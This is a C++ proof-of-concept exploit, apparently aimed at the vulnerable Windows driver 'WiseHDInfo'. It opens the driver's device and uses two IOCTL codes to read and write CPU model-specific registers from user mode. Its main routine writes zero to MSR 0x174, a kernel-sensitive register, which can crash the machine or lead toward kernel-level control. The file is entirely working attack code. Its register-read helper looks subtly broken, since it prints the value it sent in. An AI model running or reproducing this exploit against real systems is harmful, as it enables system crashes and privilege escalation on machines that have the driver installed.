#include <iostream>
#include <Windows.h>
#include <winioctl.h>

#define SymLinkName L"\\\\.\\WiseHDInfo"

HANDLE hDevice;

void rdmsr_9C402084(unsigned long Register)
{
    DWORD dwWrite;
    unsigned long data = Register;
    DeviceIoControl(hDevice, 0x9C402084, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
    printf("rdmsr result: %x", data);
}

struct DATA_9C402088
{
    unsigned long Register;
    unsigned long Value_low;
    unsigned long Value_high;
};

void wrmsr_9C402088(unsigned long Register, unsigned long long Value)
{
    DWORD dwWrite;
    DATA_9C402088 data;
    data.Register = Register;
    data.Value_low = Value & 0xffffffff;
    data.Value_high = (Value >> 32) & 0xffffffff;
    DeviceIoControl(hDevice, 0x9C402088, &data, sizeof(data), NULL, 0, &dwWrite, NULL);
}

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    wrmsr_9C402088(0x174, 0);

    system("pause");
    return 0;
}
